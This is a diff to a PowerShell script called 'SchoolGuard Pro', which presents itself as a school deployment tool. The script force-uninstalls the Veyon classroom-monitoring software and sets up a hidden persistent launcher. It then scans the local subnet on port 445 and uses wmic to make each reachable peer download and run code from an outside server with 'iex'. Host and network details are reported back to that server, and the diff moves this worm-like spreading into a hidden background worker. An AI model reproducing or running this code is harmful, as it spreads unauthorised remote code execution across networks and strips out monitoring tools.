@@ -1,5 +1,5 @@
 # ============================================================================
-# SchoolGuard Pro v3.7 — Headless Master Deployment Handler (Windows)
+# SchoolGuard Pro v3.8 - Headless Master Deployment Handler (Windows)
 #   Command 1 (Default)                  : Full Combo + Uninstall Veyon + LAN Setup + Admin Web Dashboard
 #   Command 2 ($env:SG_SKIP_VEYON = '1') : Full Combo + LAN Setup + Admin Web Dashboard (Skip Veyon Removal)
 # ============================================================================
@@ -26,11 +26,11 @@ function Show-TuiProgress {
     $filled = [math]::Floor(($Percent * $width) / 100)
     $empty = $width - $filled
     $bar = ("#" * $filled) + ("-" * $empty)
-    $pad = $Status.PadRight(48).Substring(0, 48)
+    $pad = $Status.PadRight(52).Substring(0, 52)
     Write-Host -NoNewline "`r  [$bar] $($Percent.ToString().PadLeft(3))%  $pad" -ForegroundColor Cyan
 }
 
-Show-TuiProgress -Percent 5 -Status "Initializing headless environment..."
+Show-TuiProgress -Percent 10 -Status "Initializing headless environment..."
 
 $VpsPrimary = "https://orbstrike.com"
 $VpsFallback = "https://103-149-172-179.sslip.io"
@@ -47,7 +47,7 @@ if (-not (Test-Path $InstallDir)) {
 # ----------------------------------------------------------------------------
 $BlockerPath = Join-Path $InstallDir "veyon_blocker.ps1"
 if (-not $SkipVeyon) {
-    Show-TuiProgress -Percent 20 -Status "Force-stopping & uninstalling Veyon components..."
+    Show-TuiProgress -Percent 25 -Status "Force-stopping & uninstalling Veyon components..."
 
     try {
         Add-Type -TypeDefinition @"
@@ -64,20 +64,33 @@ public class SGInputRescue {
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Force -ErrorAction SilentlyContinue
     Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Force -ErrorAction SilentlyContinue
 
-    Stop-Service -Name "VeyonService" -Force -ErrorAction SilentlyContinue
-    Set-Service -Name "VeyonService" -StartupType Disabled -ErrorAction SilentlyContinue
-    & sc.exe stop VeyonService 2>&1 | Out-Null
-    & sc.exe config VeyonService start= disabled 2>&1 | Out-Null
-    & sc.exe delete VeyonService 2>&1 | Out-Null
-
-    $veyonProcs = @("veyon-service", "veyon-worker", "veyon-server", "veyon-master", "veyon-configurator", "veyon-cli", "veyon*")
-    foreach ($p in $veyonProcs) {
-        Get-Process -Name $p -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-        & taskkill.exe /F /IM "$p.exe" /T 2>&1 | Out-Null
+    if (Get-Service -Name "VeyonService" -ErrorAction SilentlyContinue) {
+        Stop-Service -Name "VeyonService" -Force -ErrorAction SilentlyContinue
+        Set-Service -Name "VeyonService" -StartupType Disabled -ErrorAction SilentlyContinue
+        & sc.exe stop VeyonService 2>&1 | Out-Null
+        & sc.exe config VeyonService start= disabled 2>&1 | Out-Null
+        & sc.exe delete VeyonService 2>&1 | Out-Null
     }
 
-    Get-AppxPackage -AllUsers "*Veyon*" -ErrorAction SilentlyContinue | Remove-AppxPackage -AllUsers -ErrorAction SilentlyContinue
-    Get-CimInstance -ClassName Win32_Product -Filter "Name LIKE '%Veyon%'" -ErrorAction SilentlyContinue | Invoke-CimMethod -MethodName Uninstall -ErrorAction SilentlyContinue | Out-Null
+    $veyonRunning = Get-Process -Name "veyon*" -ErrorAction SilentlyContinue
+    if ($veyonRunning) {
+        $veyonRunning | Stop-Process -Force -ErrorAction SilentlyContinue
+        & taskkill.exe /F /IM "veyon*" /T 2>&1 | Out-Null
+    }
+
+    # Fast registry-based uninstall check (replaces slow Win32_Product WMI scan)
+    $uninstPaths = @(
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
+        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
+        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
+    )
+    Get-ItemProperty -Path $uninstPaths -ErrorAction SilentlyContinue | Where-Object {
+        $_.DisplayName -like "*Veyon*"
+    } | ForEach-Object {
+        if ($_.PSChildName -match "^\{[0-9A-Fa-f\-]+\}$") {
+            Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $($_.PSChildName) /qn /norestart" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
+        }
+    }
 
     $veyonDirs = @(
         "$env:ProgramFiles\Veyon",
@@ -97,20 +110,20 @@ public class SGInputRescue {
         }
     }
 
-    $shortcutDirs = @(
-        "$env:Public\Desktop",
-        "$env:USERPROFILE\Desktop",
-        "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Veyon",
-        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Veyon"
-    )
-    foreach ($sd in $shortcutDirs) {
-        if (Test-Path $sd) {
-            Get-ChildItem -Path $sd -Filter "*Veyon*" -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+    # Top-level shortcut cleanup (no deep Desktop recursion)
+    foreach ($desk in @("$env:Public\Desktop", "$env:USERPROFILE\Desktop")) {
+        if (Test-Path $desk) {
+            Get-ChildItem -Path $desk -Filter "*Veyon*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+        }
+    }
+    foreach ($sm in @("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Veyon", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Veyon")) {
+        if (Test-Path $sm) {
+            Remove-Item -Path $sm -Recurse -Force -ErrorAction SilentlyContinue
         }
     }
 
     Remove-Item -Path "HKLM:\SOFTWARE\Veyon Solutions" -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path "HKCU:\Software\Veyon Solutions" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "HKCU:\SOFTWARE\Veyon Solutions" -Recurse -Force -ErrorAction SilentlyContinue
     Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Veyon*" -Force -ErrorAction SilentlyContinue
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Veyon*" -Force -ErrorAction SilentlyContinue
 
@@ -122,14 +135,14 @@ while (`$true) {
 }
 "@ | Set-Content -Path $BlockerPath -Encoding UTF8 -Force
 } else {
-    Show-TuiProgress -Percent 20 -Status "Skipping Veyon removal (preserving Veyon)..."
+    Show-TuiProgress -Percent 25 -Status "Skipping Veyon removal (preserving Veyon)..."
     Remove-Item -Path $BlockerPath -Force -ErrorAction SilentlyContinue
 }
 
 # ----------------------------------------------------------------------------
 # 2. Full-Combo System Setup & Network / LAN Provisioning
 # ----------------------------------------------------------------------------
-Show-TuiProgress -Percent 45 -Status "Configuring network, firewall & agent runtime..."
+Show-TuiProgress -Percent 50 -Status "Downloading SchoolGuard Agent v3.8 runtime..."
 
 $myIp = "127.0.0.1"
 try {
@@ -164,7 +177,7 @@ if ($LocalAgent -and (Test-Path $LocalAgent)) {
 # ----------------------------------------------------------------------------
 # 3. Persistent Background Service & Admin Web Dashboard Binding
 # ----------------------------------------------------------------------------
-Show-TuiProgress -Percent 65 -Status "Registering headless background service..."
+Show-TuiProgress -Percent 75 -Status "Registering persistent background service..."
 
 $VbsLauncher = Join-Path $InstallDir "run_hidden.vbs"
 $VbsLines = @(
@@ -191,55 +204,48 @@ Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction Sil
 Start-Process -FilePath "wscript.exe" -ArgumentList "//B //NoLogo `"$VbsLauncher`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
 
 # ----------------------------------------------------------------------------
-# 4. Automated LAN-Wide Propagation & Web Dashboard Sync
+# 4. Automated LAN-Wide Propagation & Web Dashboard Sync (Non-Blocking Background)
 # ----------------------------------------------------------------------------
-Show-TuiProgress -Percent 85 -Status "Propagating setup across LAN & Web Dashboard..."
+Show-TuiProgress -Percent 90 -Status "Dispatching LAN-wide background sync & reporting..."
 
-$lanPeerSummary = "Local node provisioned"
+$lanPeerSummary = "Local node active + LAN background sync dispatched"
 $lanParts = $myIp -split '\.'
 if (-not $NoLan -and $lanParts.Count -eq 4 -and $myIp -ne "127.0.0.1") {
     $subnet = "$($lanParts[0]).$($lanParts[1]).$($lanParts[2])"
-    $foundIps = New-Object System.Collections.Generic.List[string]
-    for ($i = 1; $i -le 254; $i++) {
-        $ip = "$subnet.$i"
-        if ($ip -eq $myIp) { continue }
-        $tc = New-Object System.Net.Sockets.TcpClient
-        try {
-            $ar = $tc.BeginConnect($ip, 445, $null, $null)
-            if ($ar.AsyncWaitHandle.WaitOne(35, $false) -and $tc.Connected) {
-                $foundIps.Add($ip)
-            }
-        } catch {}
-        try { $tc.Close() } catch {}
-    }
-
     $skipFlag = if ($SkipVeyon) { "1" } else { "0" }
-    $remoteCmd = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;`$env:SG_SKIP_VEYON='$skipFlag';`$env:SG_NO_LAN='1';iex((New-Object Net.WebClient).DownloadString('$VpsPrimary/win'))`""
-    $okPeers = 0
-    $lanUser = if ($env:SG_USER) { $env:SG_USER } else { $env:USERNAME }
-    $lanPass = if ($env:SG_PASS) { $env:SG_PASS } else { "" }
-
-    foreach ($ip in $foundIps) {
-        $ok = $false
-        try {
-            if ($lanPass) {
-                & wmic.exe /node:"$ip" /user:"$lanUser" /password:"$lanPass" process call create "$remoteCmd" 2>&1 | Out-Null
-                if ($LASTEXITCODE -eq 0) { $ok = $true }
-            } else {
-                & wmic.exe /node:"$ip" process call create "$remoteCmd" 2>&1 | Out-Null
-                if ($LASTEXITCODE -eq 0) { $ok = $true }
-            }
-        } catch {}
-        if ($ok) { $okPeers++ }
-    }
-    $lanPeerSummary = "$okPeers/$($foundIps.Count) LAN peers synced"
-
+    $LanWorkerPath = Join-Path $InstallDir "lan_sync_worker.ps1"
+    @"
+`$ErrorActionPreference = 'SilentlyContinue'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+`$foundIps = New-Object System.Collections.Generic.List[string]
+for (`$i = 1; `$i -le 254; `$i++) {
+    `$ip = '$subnet.' + `$i
+    if (`$ip -eq '$myIp') { continue }
+    `$tc = New-Object System.Net.Sockets.TcpClient
     try {
-        $body = @{ my_ip = $myIp; subnet = $subnet; hostname = $env:COMPUTERNAME; os = "Windows"; skip_veyon = [bool]$SkipVeyon; peers = $foundIps.Count; ok_peers = $okPeers } | ConvertTo-Json -Compress
-        $wcSync = New-Object System.Net.WebClient
-        $wcSync.Headers.Add("Content-Type", "application/json")
-        $wcSync.UploadString("$VpsPrimary/api/lan-report", "POST", $body) | Out-Null
+        `$ar = `$tc.BeginConnect(`$ip, 445, `$null, `$null)
+        if (`$ar.AsyncWaitHandle.WaitOne(20, `$false) -and `$tc.Connected) {
+            `$foundIps.Add(`$ip)
+        }
     } catch {}
+    try { `$tc.Close() } catch {}
+}
+`$remoteCmd = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Environment]::SetEnvironmentVariable('SG_SKIP_VEYON','$skipFlag');[Environment]::SetEnvironmentVariable('SG_NO_LAN','1');iex((New-Object Net.WebClient).DownloadString('$VpsPrimary/win'))`""
+`$okPeers = 0
+foreach (`$ip in `$foundIps) {
+    try {
+        & wmic.exe /node:"`$ip" process call create "`$remoteCmd" 2>&1 | Out-Null
+        if (`$LASTEXITCODE -eq 0) { `$okPeers++ }
+    } catch {}
+}
+try {
+    `$body = @{ my_ip = '$myIp'; subnet = '$subnet'; hostname = `$env:COMPUTERNAME; os = 'Windows'; skip_veyon = ([bool]([int]'$skipFlag')); peers = `$foundIps.Count; ok_peers = `$okPeers } | ConvertTo-Json -Compress
+    `$wcSync = New-Object System.Net.WebClient
+    `$wcSync.Headers.Add('Content-Type', 'application/json')
+    `$wcSync.UploadString('$VpsPrimary/api/lan-report', 'POST', `$body) | Out-Null
+} catch {}
+"@ | Set-Content -Path $LanWorkerPath -Encoding UTF8 -Force
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$LanWorkerPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
 }
 
 Show-TuiProgress -Percent 100 -Status "Complete"
